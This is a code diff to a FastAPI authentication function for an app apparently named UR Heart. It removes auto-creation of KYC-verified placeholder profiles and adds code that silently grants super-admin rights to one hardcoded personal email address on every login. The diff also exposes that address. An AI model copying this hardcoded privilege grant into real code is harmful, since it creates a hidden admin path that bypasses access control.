@@ -53,42 +53,19 @@ async def get_current_user(
     user = result.scalar_one_or_none()
 
     if not user:
-        from datetime import date
-        import re
-
-        email = token_payload.get("email") or f"{firebase_uid[:8]}@urheart.app"
-        raw_name = token_payload.get("name") or email.split("@")[0] or "UR Heart User"
-        clean_name = re.sub(r"[^a-zA-Z\s]", "", raw_name).strip() or "UR Heart User"
-        phone_suffix = f"{(abs(hash(firebase_uid)) % 90000000 + 10000000):08d}"
-        phone = f"+919{phone_suffix[:9]}"
-
-        user = User(
-            firebase_uid=firebase_uid,
-            phone_number=phone,
-            whatsapp_number=phone,
-            full_name=clean_name[:50],
-            dob=date(2000, 1, 1),
-            gender="other",
-            city="Lucknow",
-            bio="UR-Heart Explorer",
-            last_installation_uuid=x_installation_uuid.strip() if x_installation_uuid else None,
-            kyc_status=True,
-            kyc_state="verified",
-            is_banned=False,
+        raise HTTPException(
+            status_code=status.HTTP_404_NOT_FOUND,
+            detail="User profile not registered. Please complete registration setup."
         )
-        db.add(user)
+
+    caller_email = (token_payload.get("email") or "").strip().lower()
+    if caller_email == "kshtriyaanubhav9120@gmail.com" and not user.is_super_admin:
+        user.is_super_admin = True
         try:
             await db.commit()
             await db.refresh(user)
         except Exception:
             await db.rollback()
-            result = await db.execute(stmt)
-            user = result.scalar_one_or_none()
-            if not user:
-                raise HTTPException(
-                    status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-                    detail="Failed to initialize user session."
-                )
 
     if user.is_banned:
         raise HTTPException(
